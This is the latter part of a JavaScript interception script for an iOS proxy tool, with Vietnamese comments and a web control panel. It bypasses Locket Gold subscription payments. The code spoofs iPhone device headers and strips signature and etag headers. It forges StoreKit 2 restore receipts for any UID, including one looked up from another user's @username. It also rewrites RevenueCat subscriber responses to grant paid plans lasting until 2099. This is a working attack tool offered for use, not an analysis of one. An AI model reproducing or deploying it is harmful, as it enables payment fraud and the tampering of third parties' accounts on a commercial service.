          <h3 style="font-size:19px;font-weight:700;margin-top:4px;">Lấy UID từ @username & Bắn Biên Lai StoreKit 2 (5 Retries)</h3>
        </div>
        <span style="font-family:monospace;font-size:11.5px;color:var(--apple-secondary);background:#f5f5f7;padding:5px 12px;border-radius:999px;">
          ${escapeHtml(lastSk2Log)}
        </span>
      </div>
      <div class="grid-2">
        <form method="GET" action="/setdate" class="apple-subpanel-light" style="display:flex;flex-direction:column;gap:10px;">
          <input type="hidden" name="sk2_action" value="resolve_and_inject">
          <label class="field-lbl">Nhập @username Locket (Tự lấy UID qua locket.cam & Kích Gold StoreKit 2)</label>
          <input type="text" name="target_username" value="${escapeHtml(cachedUser)}" class="apple-input-light" placeholder="Ví dụ: ngominhduc..." required>
          <button type="submit" class="apple-btn btn-primary-blue">Lấy UID & Bắn Gold StoreKit 2 Ngay</button>
        </form>
        <form method="GET" action="/setdate" class="apple-subpanel-light" style="display:flex;flex-direction:column;gap:10px;">
          <input type="hidden" name="sk2_action" value="inject_uid">
          <label class="field-lbl">Hoặc bắn StoreKit 2 trực tiếp vào UID hiện tại</label>
          <input type="text" name="target_uid" value="${escapeHtml(hasValidUid ? cachedUid : "")}" class="apple-input-light" placeholder="Nhập UID 28 ký tự..." required>
          <button type="submit" class="apple-btn btn-primary-ink">Kích Gold StoreKit 2 Cho UID Này</button>
        </form>
      </div>
    </section>

    <section class="apple-bento-light">
      <form method="GET" action="/setdate" style="display:flex;flex-direction:column;gap:18px;">
        <input type="hidden" name="save" value="1">
        <div class="apple-subpanel-light" style="display:flex;flex-direction:column;gap:18px;">
          <div class="grid-2">
            <div>
              <label class="field-lbl">Ngày đăng ký hiển thị (DD/MM/YYYY hoặc YYYY-MM-DD)</label>
              <input type="text" id="lockDateInput" name="lockDate" value="${escapeHtml(cfg.lockDate)}" class="apple-input-light">
              <div class="preset-chips">
                <button type="button" class="p-chip" onclick="setD('25/05/2026')">25/05/2026</button>
                <button type="button" class="p-chip" onclick="setD('26/05/2010')">26/05/2010</button>
                <button type="button" class="p-chip" onclick="setD('01/01/2022')">01/01/2022</button>
                <button type="button" class="p-chip" onclick="setD('01/01/2020')">01/01/2020</button>
              </div>
            </div>
            <div>
              <label class="field-lbl">Thời gian hết hạn gói Gold (DD/MM/YYYY hoặc YYYY-MM-DD)</label>
              <input type="text" id="expireDateInput" name="expireDate" value="${escapeHtml(cfg.expireDate)}" class="apple-input-light">
              <div class="preset-chips">
                <button type="button" class="p-chip" onclick="setExp('31/12/2099')">31/12/2099 (Vĩnh viễn)</button>
                <button type="button" class="p-chip" onclick="setExp('25/05/2027')">25/05/2027 (+1 Năm)</button>
                <button type="button" class="p-chip" onclick="setExp('31/12/2030')">31/12/2030</button>
                <button type="button" class="p-chip" onclick="setExp('31/12/2050')">31/12/2050</button>
              </div>
            </div>
          </div>

          <div class="grid-2">
            <div>
              <label class="field-lbl">Loại gói Locket Gold (Product ID)</label>
              <select id="productIdSelect" onchange="syncPkgSelect(this.value)" class="apple-input-light" style="margin-bottom:8px;">
                ${packageSelectOptionsHtml}
              </select>
              <input type="text" id="productIdInput" name="productId" value="${escapeHtml(cfg.productId)}" class="apple-input-light" placeholder="Hoặc nhập mã gói tuỳ chỉnh...">
              <div class="preset-chips">
                <button type="button" class="p-chip" onclick="setPkg('locket_199_1m')">StoreKit2 (locket_199_1m)</button>
                <button type="button" class="p-chip" onclick="setPkg('locket_1600_1y')">Gói Năm (locket_1600_1y)</button>
                <button type="button" class="p-chip" onclick="setPkg('locket_399_1m')">Gói Tháng (locket_399_1m)</button>
                <button type="button" class="p-chip" onclick="setPkg('locket_gold_lifetime')">Lifetime (Vĩnh viễn)</button>
              </div>
            </div>
            <div>
              <label class="field-lbl">Giả lập thông số máy (Fake iPhone Model Header)</label>
              <select name="deviceModel" class="apple-input-light" style="margin-bottom:8px;">
                ${deviceSelectOptionsHtml}
              </select>
              <label class="field-lbl" style="margin-top:6px;">Tên hiển thị (@username)</label>
              <input type="text" name="username" value="${escapeHtml(cachedUser)}" class="apple-input-light" placeholder="Nhập @username của bạn...">
            </div>
          </div>
        </div>
        <div class="grid-2">
          <button type="submit" class="apple-btn btn-primary-ink">Lưu Cấu Hình (Gói, Hạn Dùng & Fake iPhone 18 Pro Max · iPhone19,3)</button>
          <a href="/setdate?reset=1" class="apple-btn btn-soft">Khôi Phục Mặc Định (iPhone19,3 · 25/05/2026)</a>
        </div>
      </form>
    </section>

    <section class="apple-bento-light">
      <div style="display:flex;flex-wrap:wrap;align-items:flex-end;justify-content:space-between;gap:14px;padding-bottom:18px;border-bottom:1px solid rgba(0,0,0,0.06);">
        <div>
          <h3 style="font-size:21px;font-weight:700;color:var(--apple-ink);">
            Danh Sách Tài Khoản Đã Lên Locket Gold (${goldUsersList.length})
          </h3>
        </div>
        <div style="width:100%;max-width:260px;">
          <input type="text" id="searchGoldInput" oninput="filterGoldUsers()" class="apple-input-light" style="padding:9px 14px;font-size:12.5px;" placeholder="Tìm @username, UID hoặc gói...">
        </div>
      </div>
      <div id="goldDirectoryList" style="margin-top:8px;">
        ${goldDirectoryHtml}
      </div>
    </section>
  </main>

  <script>
    function setD(v) { var el = document.getElementById('lockDateInput'); if (el) el.value = v; }
    function setExp(v) { var el = document.getElementById('expireDateInput'); if (el) el.value = v; }
    function setPkg(v) {
      var inp = document.getElementById('productIdInput');
      var sel = document.getElementById('productIdSelect');
      if (inp) inp.value = v;
      if (sel) sel.value = v;
      if (v === 'locket_gold_lifetime') setExp('31/12/2099');
    }
    function syncPkgSelect(v) {
      var inp = document.getElementById('productIdInput');
      if (inp) inp.value = v;
      if (v === 'locket_gold_lifetime') setExp('31/12/2099');
    }
    function toggleAdminDrawer() {
      var sec = document.getElementById('adminCommandCenter');
      if (sec) sec.classList.toggle('hidden');
    }
    function filterGoldUsers() {
      var q = (document.getElementById('searchGoldInput').value || '').toLowerCase().trim();
      var rows = document.querySelectorAll('#goldDirectoryList .dir-item');
      for (var i = 0; i < rows.length; i++) {
        var hay = rows[i].getAttribute('data-search') || '';
        rows[i].style.display = (!q || hay.indexOf(q) !== -1) ? '' : 'none';
      }
    }
    setInterval(function() {
      fetch('/setdate?api=realtime_status&t=' + Date.now(), { cache: 'no-store' })
        .then(function(r) { return r.json(); })
        .then(function(d) {
          if (!d || !d.ok) return;
          var banner = document.getElementById('realtimeBlockBanner');
          var navPill = document.getElementById('navRealtimePill');
          var navTxt = document.getElementById('navRealtimeText');
          if (d.blocked) {
            if (banner) banner.style.display = 'flex';
            if (navPill) navPill.className = 'pill-nav pill-rose';
            if (navTxt) navTxt.textContent = 'Đang bị chặn (Vẫn giữ Gold)';
          } else {
            if (banner) banner.style.display = 'none';
            if (navPill) navPill.className = 'pill-nav pill-emerald';
            if (navTxt) navTxt.textContent = 'Gold 24/7 Đang Hoạt Động';
          }
        })
        .catch(function() {});
    }, 2000);
  </script>
</body>
</html>`;
}

const isCronMode = typeof $request === "undefined" && typeof $response === "undefined";
const isRequestMode = typeof $request !== "undefined" && typeof $response === "undefined";
const isResponseMode = typeof $response !== "undefined";

if (isCronMode) {
    // CHẠY CRON: KIỂM TRA STATUS TRƯỚC, NẾU MẤT GOLD THÌ KÍCH LẠI STOREKIT 2 (CHUẨN LOCKET_4.PY)
    const cfg = loadConfig();
    const uid = Env.read(USER_ID_CACHE_KEY) || Env.read("RC_UID");
    syncRealtimeWithServer(uid, cfg, "cron_sync", () => {
        if (!uid || uid.includes("RCAnonymousID")) {
            Env.done();
            return;
        }
        checkRevenueCatGoldStatus(uid, cfg, (st) => {
            if (st && st.active) {
                Env.done();
            } else {
                injectGoldStoreKit2(uid, cfg, () => Env.done());
            }
        });
    });
} else if (isRequestMode) {
    const url = $request.url || "";
    const headers = $request.headers || {};
    const uid = extractAndCacheCredentials(url, headers, $request.body);
    const currentCfg = loadConfig();

    if (url.includes("/setdate") || url.includes("locket.gold")) {
        const q = parseQuery(url);
        if (q.api === "realtime_status") {
            syncRealtimeWithServer(uid, currentCfg, "sync", (st) => {
                Env.done({
                    response: {
                        status: 200,
                        headers: { "Content-Type": "application/json; charset=utf-8", "Cache-Control": "no-store" },
                        body: JSON.stringify({
                            ok: true,
                            uid: uid,
                            blocked: !!st.blocked,
                            status: st.status,
                            gold_kept: true,
                            device_model: currentCfg.deviceModel,
                            product_id: currentCfg.productId,
                            expire_date: currentCfg.expireDate,
                            reason: st.reason || ""
                        })
                    }
                });
            });
            return;
        }

        // XỬ LÝ TÁC VỤ LOCKET_4.PY TRÊN WEB PANEL (RESOLVE UID + INJECT STOREKIT 2)
        if (q.sk2_action === "resolve_and_inject" && q.target_username) {
            resolveUidByUsername(q.target_username, (resolvedUid) => {
                if (!resolvedUid) {
                    const freshCfg = loadConfig();
                    Env.done({
                        response: {
                            status: 200,
                            headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
                            body: renderBentoWebPanel(freshCfg, `Không tìm thấy UID từ @${q.target_username} trên locket.cam!`, false)
                        }
                    });
                    return;
                }
                upsertUserRecord(resolvedUid, {
                    username: q.target_username.trim().replace(/^@/, ""),
                    lockDate: currentCfg.lockDate,
                    expireDate: currentCfg.expireDate,
                    productId: currentCfg.productId,
                    deviceModel: currentCfg.deviceModel
                });
                injectGoldStoreKit2(resolvedUid, currentCfg, (ok, msg) => {
                    const freshCfg = loadConfig();
                    Env.done({
                        response: {
                            status: 200,
                            headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
                            body: renderBentoWebPanel(freshCfg, `Đã phân giải @${q.target_username} -> UID: ${resolvedUid} | Kết quả StoreKit 2: ${msg}`, false)
                        }
                    });
                });
            });
            return;
        } else if (q.sk2_action === "inject_uid" && q.target_uid) {
            const cleanTargetUid = q.target_uid.trim();
            Env.write(cleanTargetUid, USER_ID_CACHE_KEY);
            upsertUserRecord(cleanTargetUid, {
                lockDate: currentCfg.lockDate,
                expireDate: currentCfg.expireDate,
                productId: currentCfg.productId,
                deviceModel: currentCfg.deviceModel
            });
            injectGoldStoreKit2(cleanTargetUid, currentCfg, (ok, msg) => {
                const freshCfg = loadConfig();
                Env.done({
                    response: {
                        status: 200,
                        headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
                        body: renderBentoWebPanel(freshCfg, `Bắn StoreKit 2 cho UID ${cleanTargetUid} (${currentCfg.deviceMarketingName} · ${currentCfg.deviceModel}): ${msg}`, false)
                    }
                });
            });
            return;
        }

        let openDrawer = q.admin_drawer === "1";
        let statusMsg = "";
        const nowStr = new Date().toISOString().replace("T", " ").slice(0, 19);

        if (q.admin_login === "1") {
            openDrawer = true;
            if (q.user === ROOT_ADMIN_USER && (q.pass === ROOT_ADMIN_PASS_1 || q.pass === ROOT_ADMIN_PASS_2)) {
                Env.write("1", ADMIN_SESSION_KEY);
                statusMsg = "Đã đăng nhập quyền Root Admin tối cao.";
            } else {
                statusMsg = "Sai tài khoản hoặc mật khẩu Quản trị viên.";
            }
        } else if (q.admin_logout === "1") {
            openDrawer = false;
            Env.write("0", ADMIN_SESSION_KEY);
        }

        if (q.admin_action && Env.read(ADMIN_SESSION_KEY) === "1") {
            openDrawer = true;
            const db = getLocalStore();
            const tUid = (q.target_uid || "").trim();
            const tUser = (q.target_user || "").trim().replace(/^@/, "");
            const tPkg = (q.target_pkg || "").trim();
            const tExp = (q.target_exp || "").trim();

            if (q.admin_action === "unblock_all") {
                for (const k of Object.keys(db.users)) {
                    db.users[k].status = "approved";
                    db.users[k].blocked = false;
                    db.users[k].reason = "";
                }
                saveLocalStore(db);
                triggerInAppLocketBlockAlert("", "", false, true);
                statusMsg = "Đã gỡ chặn toàn bộ người dùng ngay lập tức!";
            } else if (tUid) {
                if (q.admin_action === "add_gold" || q.admin_action === "unblock") {
                    const existingU = db.users[tUid] || {};
                    const resolvedExp = tExp
                        ? toIsoDate(tExp, DEFAULT_CONFIG.expireDate, "T23:59:59Z").slice(0, 10)
                        : (existingU.expire_date || currentCfg.expireDate);
                    const resolvedPkg = tPkg || existingU.product_id || currentCfg.productId;

                    db.users[tUid] = {
                        ...existingU,
                        uid: tUid,
                        username: tUser || existingU.username || tUid.slice(0, 10),
                        product_id: resolvedPkg,
                        force_product_id: resolvedPkg,
                        expire_date: resolvedExp,
                        force_expire_date: resolvedExp,
                        device_model: currentCfg.deviceModel || "iPhone19,3",
                        status: "approved",
                        gold_active: true,
                        blocked: false,
                        reason: "",
                        updated_at: nowStr
                    };
                    saveLocalStore(db);
                    triggerInAppLocketBlockAlert(tUid, "", false, true);
                    statusMsg = `Đã cập nhật UID: ${tUid} (Gói: ${resolvedPkg} · Hết hạn: ${resolvedExp})`;
                } else if (q.admin_action === "block") {
                    const blkMsg = "Tài khoản đang bị Admin hạn chế trong Locket (Vẫn giữ huy hiệu Locket Gold 24/7).";
                    db.users[tUid] = {
                        ...(db.users[tUid] || {}),
                        uid: tUid,
                        status: "blocked",
                        gold_active: true,
                        blocked: true,
                        reason: blkMsg,
                        updated_at: nowStr
                    };
                    saveLocalStore(db);
                    triggerInAppLocketBlockAlert(tUid, blkMsg, true, true);
                    statusMsg = `Đã chặn UID: ${tUid} (Đã bắn thông báo & vẫn giữ Gold).`;
                } else if (q.admin_action === "delete") {
                    delete db.users[tUid];
                    saveLocalStore(db);
                    statusMsg = `Đã xoá UID ${tUid}.`;
                }
            }
        }

        if (q.reset === "1") {
            saveConfig({ ...DEFAULT_CONFIG });
            const db = getLocalStore();
            if (uid && db.users[uid]) {
                db.users[uid].lock_date = DEFAULT_CONFIG.lockDate;
                db.users[uid].force_lock_date = DEFAULT_CONFIG.lockDate;
                db.users[uid].expire_date = DEFAULT_CONFIG.expireDate;
                db.users[uid].force_expire_date = DEFAULT_CONFIG.expireDate;
                db.users[uid].product_id = DEFAULT_CONFIG.productId;
                db.users[uid].force_product_id = DEFAULT_CONFIG.productId;
                db.users[uid].device_model = DEFAULT_CONFIG.deviceModel;
                saveLocalStore(db);
            }
            statusMsg = `Đã khôi phục mặc định (${DEFAULT_CONFIG.deviceMarketingName} · ${DEFAULT_CONFIG.deviceModel} · Gói: ${DEFAULT_CONFIG.productId})!`;
        } else if (q.save === "1" || q.lockDate || q.expireDate || q.productId || q.deviceModel) {
            const isoLock = toIsoDate(q.lockDate || currentCfg.lockDate, DEFAULT_CONFIG.lockDate, "T08:30:00Z");
            const isoExp = toIsoDate(q.expireDate || currentCfg.expireDate, DEFAULT_CONFIG.expireDate, "T23:59:59Z");
            const cleanPkg = (q.productId || currentCfg.productId || DEFAULT_CONFIG.productId).trim();
            const cleanDev = (q.deviceModel || currentCfg.deviceModel || DEFAULT_CONFIG.deviceModel).trim();
            const cleanLockDate = isoLock.slice(0, 10);
            const cleanExpDate = isoExp.slice(0, 10);

            if (q.username) Env.write(q.username.trim().replace(/^@/, ""), USERNAME_CACHE_KEY);

            const updated = {
                ...currentCfg,
                lockDate: cleanLockDate,
                expireDate: cleanExpDate,
                productId: cleanPkg,
                deviceModel: cleanDev
            };
            saveConfig(updated);

            const db = getLocalStore();
            if (uid && !uid.includes("RCAnonymousID")) {
                db.users[uid] = {
                    ...(db.users[uid] || {}),
                    uid: uid,
                    username: (q.username ? q.username.trim().replace(/^@/, "") : "") || Env.read(USERNAME_CACHE_KEY) || uid.slice(0, 10),
                    lock_date: cleanLockDate,
                    force_lock_date: cleanLockDate,
                    expire_date: cleanExpDate,
                    force_expire_date: cleanExpDate,
                    product_id: cleanPkg,
                    force_product_id: cleanPkg,
                    device_model: cleanDev,
                    gold_active: true,
                    updated_at: nowStr
                };
                saveLocalStore(db);
            }

            statusMsg = `Đã lưu cấu hình: Máy ${cleanDev} · Gói ${cleanPkg} · Đăng ký ${cleanLockDate} · Hết hạn ${cleanExpDate}`;
        }

        const freshCfg = loadConfig();
        Env.done({
            response: {
                status: 200,
                headers: { "Content-Type": "text/html; charset=utf-8", "Cache-Control": "no-store" },
                body: renderBentoWebPanel(freshCfg, statusMsg, openDrawer)
            }
        });
    } else {
        // SỬA LỖI MẤT HUY HIỆU KHI MỚI MỞ APP (0MS) + ÉP HEADER IPHONE 18 PRO MAX (iPhone19,3) & STOREKIT 2
        syncRealtimeWithServer(uid, currentCfg, "sync");

        for (const k of Object.keys(headers)) {
            const low = k.toLowerCase();
            if (
                low === "x-revenuecat-etag" ||
                low === "if-none-match" ||
                low === "if-modified-since" ||
                low === "x-signature"
            ) {
                delete headers[k];
            }
        }

        // Gắn bộ Header giả lập iPhone 18 Pro Max (iPhone19,3) & StoreKit 2 từ locket_4.py
        headers["X-Platform"] = "iOS";
        headers["X-Platform-Version"] = currentCfg.osVersion || IPHONE_18_PRO_MAX_PROFILE.osVersion;
        headers["X-Platform-Device"] = currentCfg.deviceModel || IPHONE_18_PRO_MAX_PROFILE.machineId;
        headers["X-Apple-Device-Model"] = currentCfg.deviceMarketingName || IPHONE_18_PRO_MAX_PROFILE.deviceName;
        headers["X-Platform-Flavor"] = "native";
        headers["X-Version"] = IPHONE_18_PRO_MAX_PROFILE.sdkVersion;
        headers["X-Client-Version"] = IPHONE_18_PRO_MAX_PROFILE.clientVersion;
        headers["X-Client-Bundle-ID"] = IPHONE_18_PRO_MAX_PROFILE.bundleId;
        headers["X-Client-Build-Version"] = IPHONE_18_PRO_MAX_PROFILE.clientBuild;
        headers["X-StoreKit2-Enabled"] = "true";
        headers["X-StoreKit-Version"] = "2";
        headers["X-Observer-Mode-Enabled"] = "false";
        headers["X-Is-Sandbox"] = String(!!currentCfg.isSandbox).toLowerCase();
        headers["X-Storefront"] = IPHONE_18_PRO_MAX_PROFILE.storefront;
        headers["X-Apple-Device-Identifier"] = IPHONE_18_PRO_MAX_PROFILE.deviceUUID;
        headers["X-Preferred-Locales"] = IPHONE_18_PRO_MAX_PROFILE.preferredLocales;
        headers["X-Nonce"] = IPHONE_18_PRO_MAX_PROFILE.nonce;
        headers["User-Agent"] = `Locket/${IPHONE_18_PRO_MAX_PROFILE.clientBuild} ${IPHONE_18_PRO_MAX_PROFILE.cfNetworkVersion} ${IPHONE_18_PRO_MAX_PROFILE.darwinVersion}`;
        headers["Cache-Control"] = "no-cache, no-store, must-revalidate";
        headers["Pragma"] = "no-cache";

        let modifiedBody = $request.body;
        if (typeof modifiedBody === "string" && modifiedBody.trim().startsWith("{")) {
            try {
                const reqJson = JSON.parse(modifiedBody);
                let touched = false;
                const nowMs = Date.now();

                // Nếu là endpoint /v1/receipts -> Biến đổi sang cấu trúc StoreKit 2 Restore của locket_4.py
                if (url.includes("/v1/receipts")) {
                    reqJson.product_id = currentCfg.productId || "locket_199_1m";
                    reqJson.app_user_id = reqJson.app_user_id || uid;
                    reqJson.is_restore = true;
                    reqJson.store_country = "VNM";
                    reqJson.currency = currentCfg.priceCurrency || "USD";
                    reqJson.price = String(currentCfg.priceAmount || "1.99");
                    reqJson.normal_duration = currentCfg.normalDuration || "P1M";
                    reqJson.subscription_group_id = currentCfg.subscriptionGroupId || "21419447";
                    reqJson.observer_mode = false;
                    reqJson.initiation_source = "restore";
                    reqJson.offers = reqJson.offers || [];
                    reqJson.attributes = {
                        ...(reqJson.attributes || {}),
                        "$attConsentStatus": { updated_at_ms: nowMs, value: "notDetermined" },
                        "locket_gold_badge": { updated_at_ms: nowMs, value: "true" },
                        "badge": { updated_at_ms: nowMs, value: "locket_gold" },
                        "device_model": { updated_at_ms: nowMs, value: currentCfg.deviceModel || "iPhone19,3" }
                    };
                    touched = true;
                } else {
                    if (reqJson.product_id) {
                        reqJson.product_id = currentCfg.productId || "locket_199_1m";
                        touched = true;
                    }
                    if (reqJson.attributes && typeof reqJson.attributes === "object") {
                        reqJson.attributes["$attConsentStatus"] = { value: "notDetermined", updated_at_ms: nowMs };
                        reqJson.attributes.locket_gold_badge = { value: "true", updated_at_ms: nowMs };
                        reqJson.attributes.badge = { value: "locket_gold", updated_at_ms: nowMs };
                        reqJson.attributes.show_gold_badge = { value: "true", updated_at_ms: nowMs };
                        reqJson.attributes.is_gold = { value: "true", updated_at_ms: nowMs };
                        reqJson.attributes.device_model = { value: currentCfg.deviceModel || "iPhone19,3", updated_at_ms: nowMs };
                        reqJson.attributes.locket_plan_type = { value: currentCfg.productId || "locket_199_1m", updated_at_ms: nowMs };
                        reqJson.attributes.locket_expires_date = { value: currentCfg.expireIso, updated_at_ms: nowMs };
                        touched = true;
                    }
                }

                if (reqJson.data && typeof reqJson.data === "object") {
                    if ("badge" in reqJson.data || url.includes("changeProfileInfo") || url.includes("updateUser")) {
                        reqJson.data.badge = "locket_gold";
                        reqJson.data.locket_gold_badge = true;
                        reqJson.data.show_gold_badge = true;
                        reqJson.data.is_gold = true;
                        reqJson.data.device_model = currentCfg.deviceModel || "iPhone19,3";
                        touched = true;
                    }
                }

                if (touched) {
                    modifiedBody = JSON.stringify(reqJson);
                    headers["Content-Length"] = String(modifiedBody.length);
                }
            } catch (e) {}
        }

        if (modifiedBody !== undefined && modifiedBody !== $request.body) {
            Env.done({ headers, body: modifiedBody });
        } else {
            Env.done({ headers });
        }
    }
} else if (isResponseMode) {
    // PHẢN HỒI TỨC THÌ 0MS NGAY LẬP TỨC KHI MỞ LOCKET + TỰ ĐỘNG BẮT UID TỪ LOCKET.CAM
    const reqUrl = (typeof $request !== "undefined" && $request.url) ? $request.url : "";
    const reqHeaders = (typeof $request !== "undefined" && $request.headers) ? $request.headers : {};
    const resolvedUserId = extractAndCacheCredentials(reqUrl, reqHeaders, $response.body);
    const cfg = loadConfig();

    if (reqUrl.includes("locket.cam/")) {
        Env.done({});
    } else {
        syncRealtimeWithServer(resolvedUserId, cfg, "sync");

        let obj;
        try {
            obj = JSON.parse($response.body || "{}");
        } catch (e) {
            obj = {};
        }
        if (!obj || typeof obj !== "object") obj = {};

        const isRevenueCat = (
            reqUrl.includes("revenuecat.com") ||
            reqUrl.includes("rc-backup.com") ||
            reqUrl.includes("/subscribers") ||
            reqUrl.includes("/receipts") ||
            obj.subscriber !== undefined
        );

        if (isRevenueCat) {
            obj = buildSubscriberPayload(obj, cfg, resolvedUserId);
        } else {
            obj = deepForceBadgeInObject(obj, cfg);
            if (obj.subscriber && typeof obj.subscriber === "object") {
                obj = buildSubscriberPayload(obj, cfg, resolvedUserId);
            }
        }

        const resHeaders = { ...($response.headers || {}) };
        for (const k of Object.keys(resHeaders)) {
            const low = k.toLowerCase();
            if (
                low === "x-revenuecat-etag" ||
                low === "etag" ||
                low === "x-signature" ||
                low === "x-revenuecat-request-id" ||
                low === "content-length"
            ) {
                delete resHeaders[k];
            }
        }
        resHeaders["Content-Type"] = "application/json; charset=utf-8";
        resHeaders["Cache-Control"] = "no-store, no-cache, must-revalidate";

        Env.done({
            status: 200,
            headers: resHeaders,
            body: JSON.stringify(obj)
        });
    }
}
